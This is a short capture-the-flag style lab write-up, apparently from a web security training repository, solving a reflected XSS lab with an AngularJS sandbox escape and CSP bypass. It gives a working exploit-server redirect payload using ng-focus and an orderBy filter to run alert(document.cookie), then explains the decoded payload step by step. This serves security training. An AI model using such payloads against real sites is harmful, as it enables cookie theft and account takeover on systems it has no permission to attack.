# Lab: Reflected XSS with AngularJS sandbox escape and CSP

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/5189f85b-e2b7-4d11-91fa-c54c5f0a0303)

## Solution

Go to the exploit server and in the body section enter -

```Javascript
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

Then click on **store** and then **Deliver exploit to vitctm** to finish the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/8f181830-03ea-4e0f-8b4c-75619deafca8)

- `%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x` decodes to -> `<input id="x" ng-focus="$event.composedPath() | orderBy:'(z=alert)(document.cookie)'">`

- <input id="x">: This creates an <input> element with the ID attribute set to "x".
- `ng-focus="$event.composedPath() | orderBy:'(z=alert)(document.cookie)'"`: This is an AngularJS expression attached to the ng-focus directive of the `<input>` element.

  - `$event.composedPath()` captures the event path when the `<input>` element receives focus.

  - `orderBy:'(z=alert)(document.cookie)'` attempts to use the orderBy AngularJS filter with a crafted sorting criterion `'z=alert)(document.cookie)'`. The intention is to execute JavaScript code (alert(document.cookie)) within the AngularJS context.
